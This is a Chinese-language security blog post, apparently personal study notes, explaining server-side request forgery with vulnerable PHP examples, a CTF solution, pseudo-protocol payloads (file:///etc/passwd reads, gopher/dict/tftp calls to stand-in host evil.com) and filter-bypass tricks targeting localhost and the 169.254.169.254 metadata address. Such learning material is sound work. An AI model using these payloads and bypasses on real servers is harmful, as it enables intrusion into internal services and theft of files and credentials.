@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>ssrf学习 - 天下同春</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="ssrf学习 - 天下同春" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://example.com/2024/11/14/ssrf%E5%AD%A6%E4%B9%A0/index.html" />
+  
+  <meta property="og:image" content="/img/LR.jpg" />
+  
+  <meta property="og:article:published_time" content="2024-11-14T12:38:24.570Z" />
+  
+  <meta property="og:article:author" content="void2eye" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+    <script src='https://unpkg.com/@waline/client@v2/dist/waline.js'></script>
+    <link
+      rel="stylesheet"
+      href="https://unpkg.com/@waline/client@v2/dist/waline.css"
+    />
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">天下同春</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/">Home</a>
+            
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/void2eye" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/Web/">Web</a>
+        
+            <a href="/categories/Web/ssrf/">ssrf</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>November</span>
+            <span>14,</span>
+            <span>2024</span>
+        </div>
+        
+
+        <h1 class="title">ssrf学习</h1>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <h1 id="ssrf学习"><a href="#ssrf学习" class="headerlink" title="ssrf学习"></a>ssrf学习</h1><h2 id="ssrf漏洞原理："><a href="#ssrf漏洞原理：" class="headerlink" title="ssrf漏洞原理："></a>ssrf漏洞原理：</h2><blockquote>
+<p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p>
+</blockquote>
+<p>ssrf攻击对象一般是外网不通的服务器，而造成这一漏洞的原因大都是因为被攻击的服务器<font color="red">提供了与其他服务器交互数据的功能。</font></p>
+<p>且对目标的地址没有过滤和限制（或可以绕过</p>
+<p><img src="/img/ssrf.png" alt="ssrf"></p>
+<p>黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用<font color="red">存在缺陷的web应用作为代理攻击远程和本地的服务器</font></p>
+<h2 id="ssrf漏洞场景："><a href="#ssrf漏洞场景：" class="headerlink" title="ssrf漏洞场景："></a>ssrf漏洞场景：</h2><blockquote>
+<p>场景:</p>
+<ol>
+<li>分享：通过URL地址分享网页内容  </li>
+<li>转码服务:通过URL地址把原地址的网页内容调优使其适合手机屏幕浏览</li>
+<li>在线翻译:通过URL地址翻译对应文本的内容。</li>
+<li>图片、文章收藏功能:此处的图片、文章收藏中的文章收藏就类似于分享功能中获取URL地址中title以及文本的内容作为显示<blockquote>
+<p><a target="_blank" rel="noopener" href="http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de">http://title.xxx.com/title?title=http://title.xxx.com/as52ps63de</a><br>例如title参数是文章的标题地址，代表了一个文章的地址链接，请求后返回文章是否保存，收藏的返回信息。如果保存，收藏功能采用了此种形式保存文章，则在没有限制参数的形式下可能存在SSRF。</p>
+</blockquote>
+</li>
+<li>未公开的api实现以及其他调用URL的功能:此处类似的功能有360提供的网站评分，以及有些网站通过api获取远程地址xml文件来加载内容。</li>
+<li>图片加载与下载(当然img标签就行了，但不排除一些开发者对图片进行水印调整或压缩等操作便会造成ssrf)</li>
+<li>从URL关键字中寻找<br>利用google 语法加上这些关键字去寻找SSRF漏洞<blockquote>
+<p>share<br>wap<br>url<br>link<br>src<br>source<br>target<br>u<br>display<br>sourceURl<br>imageURL<br>domain</p>
+</blockquote>
+</li>
+</ol>
+</blockquote>
+<h2 id="ssrf漏洞函数（任何语言都可能，以PHP为例）"><a href="#ssrf漏洞函数（任何语言都可能，以PHP为例）" class="headerlink" title="ssrf漏洞函数（任何语言都可能，以PHP为例）"></a>ssrf漏洞函数（任何语言都可能，以PHP为例）</h2><h3 id="1-file-get-contents"><a href="#1-file-get-contents" class="headerlink" title="1. file_get_contents():"></a>1. file_get_contents():</h3><p>下面的代码使用file_get_contents函数从用户指定的url获取图片。然后把它用一个随机文件名保存在硬盘上，并展示给用户。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>])) </span><br><span class="line">&#123; </span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]); </span><br><span class="line"><span class="variable">$filename</span> =<span class="string">&#x27;./images/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;;img1.jpg&#x27;</span>; </span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$content</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]; </span><br><span class="line"><span class="variable">$img</span> = <span class="string">&quot;&lt;img src=\&quot;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;\&quot;/&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$img</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-fsockopen"><a href="#2-fsockopen" class="headerlink" title="2. fsockopen():"></a>2. fsockopen():</h3><p>以下代码使用fsockopen函数实现获取用户制定url的数据（文件或者html）。这个函数会使用socket跟服务器建立tcp连接，传输原始数据。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params"><span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>); </span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (error number <span class="subst">$errno</span>) \n&quot;</span>; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123; </span><br><span class="line"><span class="variable">$out</span> = <span class="string">&quot;GET <span class="subst">$link</span> HTTP/1.1\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>; </span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;\r\n&quot;</span>; </span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>); </span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; </span><br><span class="line"><span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123; </span><br><span class="line"><span class="variable">$contents</span>.= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>); </span><br><span class="line"><span class="keyword">return</span> <span class="variable">$contents</span>; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>例题：[HNCTF 2022 WEEK2]ez_ssrf<br>源码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line"><span class="variable">$port</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;port&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>,<span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>),<span class="variable">$error</span>,<span class="variable">$errstr</span>,<span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$fp</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="variable">$data</span>);</span><br><span class="line">    <span class="keyword">while</span>(!<span class="title function_ invoke__">feof</span>(<span class="variable">$data</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>,<span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+<p>一个简单的不设防的套接字（socket）建立起的两个程序之间的通信连接，根据提示，构造exp：<br>（GET &#x2F;flag.php HTTP&#x2F;1.1<br>Host: 127.0.0.1<br>Connection: Keep-Alive先base）  </p>
+<p>&#x2F;?host&#x3D;127.0.0.1&amp;port&#x3D;80&amp;data&#x3D;R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBDbG9zZQ0KDQo&#x3D;</p>
+<h3 id="3-curl-exec"><a href="#3-curl-exec" class="headerlink" title="3. curl_exec():"></a>3. curl_exec():</h3><p>cURL这是另一个非常常见的实现，它通过 PHP获取数据。文件&#x2F;数据被下载并存储在“curled”文件夹下的磁盘中，并附加了一个随机数和“.txt”文件扩展名。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$link</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$filename</span> = <span class="string">&#x27;./curled/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$result</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><font color="red">注意事项</font></p>
+<blockquote>
+<ol>
+<li>一般情况下PHP不会开启fopen的gopher wrapper</li>
+<li>file_get_contents的gopher协议不能URL编码</li>
+<li>file_get_contents关于Gopher的302跳转会出现bug，导致利用失败</li>
+<li>curl&#x2F;libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用</li>
+<li>curl_exec() 默认不跟踪跳转，</li>
+<li>file_get_contents() file_get_contents支持php:&#x2F;&#x2F;input协议</li>
+</ol>
+</blockquote>
+<h2 id="ssrf中的伪协议"><a href="#ssrf中的伪协议" class="headerlink" title="ssrf中的伪协议"></a>ssrf中的伪协议</h2><p>当我们发现SSRF漏洞后，先试试伪协议</p>
+<blockquote>
+</blockquote>
+<pre><code>file:/// 从文件系统中获取文件内容，如，file:///etc/passwd
+dict:// 字典服务器协议，访问字典资源，如，dict:///ip:6739/info：
+sftp:// SSH文件传输协议或安全文件传输协议
+ldap:// 轻量级目录访问协议
+tftp:// 简单文件传输协议
+gopher:// 分布式文档传递服务，可使用gopherus生成payload
+</code></pre>
+<p>例子：</p>
+<ol>
+<li><p>file：<br><a href="http://example.com/ssrf.php?url=file:///etc/passwd">http://example.com/ssrf.php?url=file:///etc/passwd</a><br><a href="http://example.com/ssrf.php?url=file:///C:/Windows/win.ini">http://example.com/ssrf.php?url=file:///C:/Windows/win.ini</a></p>
+</li>
+<li><p>dict：能够引用允许通过DICT协议使用的定义或单词列表<br><a href="http://example.com/ssrf.php?dict://evil.com:1337/">http://example.com/ssrf.php?dict://evil.com:1337/</a> </p>
+<blockquote>
+<p>$ nc -lvp 1337<br>Connection from [192.168.0.12] port 1337[tcp&#x2F;*]<br>accepted (family 2, sport 31126)CLIENT libcurl 7.40.0  </p>
+</blockquote>
+</li>
+<li><p>sftp:<br>Sftp代表SSH文件传输协议（SSH File Transfer Protocol），或安全文件传输协议（Secure File Transfer Protocol），这是一种与SSH打包在一起的单独协议，它运行在安全连接上，并以类似的方式进行工作。<br><a href="http://example.com/ssrf.php?url=sftp://evil.com:1337/">http://example.com/ssrf.php?url=sftp://evil.com:1337/</a>  </p>
+<blockquote>
+<p>$ nc -lvp 1337<br>Connection from [192.168.0.12] port 1337[tcp&#x2F;*]<br>accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2  </p>
+</blockquote>
+</li>
+<li><p>dap:&#x2F;&#x2F;或ldaps:&#x2F;&#x2F; 或ldapi:&#x2F;&#x2F;:<br>LDAP代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议<br><a href="http://example.com/ssrf.php?url=ldap://localhost:1337/%0Astats%0Aquit">http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquit</a>  </p>
+<p> <a href="http://example.com/ssrf.php?url=ldaps://localhost:1337/%0Astats%0Aquit">http://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquit</a>  </p>
+<p> <a href="http://example.com/ssrf.php?url=ldapi://localhost:1337/%0Astats%0Aquit">http://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit</a>  </p>
+</li>
+<li><p>tftp:&#x2F;&#x2F;:<br>TFTP（Trivial File Transfer Protocol,简单文件传输协议）是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</p>
+</li>
+</ol>
+<p><a href="http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET">http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET</a>  </p>
+<blockquote>
+<p>&#x2F;# nc -lvup 1337<br>   Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3</p>
+</blockquote>
+<ol start="6">
+<li>gopher:&#x2F;&#x2F;:<br>Gopher是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息</li>
+</ol>
+<p><a href="http://example.com/ssrf.php?url=http://attacker.com/gopher.php">http://example.com/ssrf.php?url=http://attacker.com/gopher.php</a> gopher.php (host it on acttacker.com):加上</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-<span class="meta">&lt;?php</span> <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: gopher://evil.com:1337/_Hi%0Assrf%0Atest&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>&#x2F;# nc -lvp 1337<br>Listening on [0.0.0.0] (family 0, port1337)Connection from [192.168.0.12] port 1337[tcp&#x2F;*] accepted (family 2, sport 49398)Hissrftest</p>
+</blockquote>
+<h2 id="ssrf绕过方式"><a href="#ssrf绕过方式" class="headerlink" title="ssrf绕过方式"></a>ssrf绕过方式</h2><p>1、限制为<a target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com</a> 域名时（利用@）</p>
+<blockquote>
+<p>可以尝试采用http基本身份认证的方式绕过<br>如：<a target="_blank" rel="noopener" href="http://www.aaa.com%40www.bbb.com%40www.ccc.com%EF%BC%8C%E5%9C%A8%E5%AF%B9@解析域名中,不同的处理函数存在处理差异/">http://www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异</a><br>在PHP的parse_url中会识别<a target="_blank" rel="noopener" href="http://www.ccc.com,而libcurl则识别为www.bbb.com./">www.ccc.com，而libcurl则识别为www.bbb.com。</a></p>
+</blockquote>
+<p>2.采用短网址绕过</p>
+<blockquote>
+<p>比如百度短地址<a target="_blank" rel="noopener" href="https://dwz.cn/">https://dwz.cn/</a></p>
+</blockquote>
+<p>3.采用进制转换</p>
+<blockquote>
+<p>127.0.0.1八进制：0177.0.0.1。十六进制：0x7f.0.0.1。十进制：2130706433.</p>
+</blockquote>
+<p>4.利用特殊域名</p>
+<blockquote>
+<p>原理是DNS解析。xip.io可以指向任意域名，即<br>127.0.0.1.xip.io，可解析为127.0.0.1<br>(xip.io 现在好像用不了了，可以找找其他的)</p>
+</blockquote>
+<p>5.利用[::]</p>
+<blockquote>
+<p>可以利用[::]来绕过localhost<br><a href="http://169.254.169.254>>http://[::169.254.169.254]">http://169.254.169.254&gt;&gt;http://[::169.254.169.254]</a></p>
+</blockquote>
+<p>6.利用句号</p>
+<blockquote>
+<p>127。0。0。1 &gt;&gt;&gt; 127.0.0.1</p>
+</blockquote>
+<p>7.CRLF 编码绕过</p>
+<blockquote>
+<p>%0d-&gt;0x0d-&gt;\r回车<br>%0a-&gt;0x0a-&gt;\n换行<br>进行HTTP头部注入</p>
+</blockquote>
+<p>example.com&#x2F;?url&#x3D;<a href="http://eval.com%0d%0aHOST:fuzz.com%0d%0a">http://eval.com%0d%0aHOST:fuzz.com%0d%0a</a> </p>
+<p>8.利用封闭的字母数字</p>
+<blockquote>
+<p>利用Enclosed alphanumerics<br>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ &gt;&gt;&gt; example.com<br><a href="http://169.254.169.254>>>http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]">http://169.254.169.254&gt;&gt;&gt;http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]</a><br>List:<br>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳<br>⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇<br>⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛<br>⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵<br>Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ<br>ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ<br>⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴<br>⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</p>
+</blockquote>
+<h3 id="限制应对"><a href="#限制应对" class="headerlink" title="限制应对"></a>限制应对</h3><p>1.限制为<a target="_blank" rel="noopener" href="http://www.xxx.com/">http://www.xxx.com</a> 域名</p>
+<blockquote>
+<p>采用http基本身份认证的方式绕过，即@<br><a target="_blank" rel="noopener" href="http://www.xxx.com@www.xxc.com/">http://www.xxx.com@www.xxc.com</a></p>
+</blockquote>
+<p>2.限制请求IP不为内网地址</p>
+<blockquote>
+<p>当不允许ip为内网地址时：<br>（1）采取短网址绕过<br>（2）采取特殊域名<br>（3）采取进制转换</p>
+</blockquote>
+<p>3.限制请求只为http协议</p>
+<blockquote>
+<p>（1）采取302跳转<br>（2）采取短地址</p>
+</blockquote>
+<hr>
+<p>参考文献：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43378996/article/details/124050308?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170908672116800227424996%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=170908672116800227424996&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~top_click~default-2-124050308-null-null.nonecase&utm_term=ssrf&spm=1018.2226.3001.4450">https://blog.csdn.net/qq_43378996/article/details/124050308?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522170908672116800227424996%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=170908672116800227424996&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~top_click~default-2-124050308-null-null.nonecase&amp;utm_term=ssrf&amp;spm=1018.2226.3001.4450</a></p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by void2eye, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/Web/" class="tag">#Web</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2024/11/14/webshell%E6%80%BB%E7%BB%93%E7%AF%87/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">webshell总结篇</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2024/11/14/sql%E6%B3%A8%E5%85%A5%EF%BC%9A%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">sql注入：从入门到入土</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        <div class="container">
+            <div id="waline"></div>
+            <script>
+                new Waline({
+                    el: "#waline",
+                    
+                    path: location.pathname,
+                    
+                    serverURL: https://blogcomment-blond.vercel.app/,
+                    
+                    requiredMeta: ['nick'],
+                    
+                });
+            </script>
+        </div>
+        
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/void2eye/Registration-tool-automatic-submission-script" class="item">RE_tools</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a href="mailto:2110027730@qq.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2024 void2eye<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        <br>
+        <span class="footer-extra-description"><a href="https://beian.miit.gov.cn/" target="_blank">浙ICP备2024135394号</a></span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
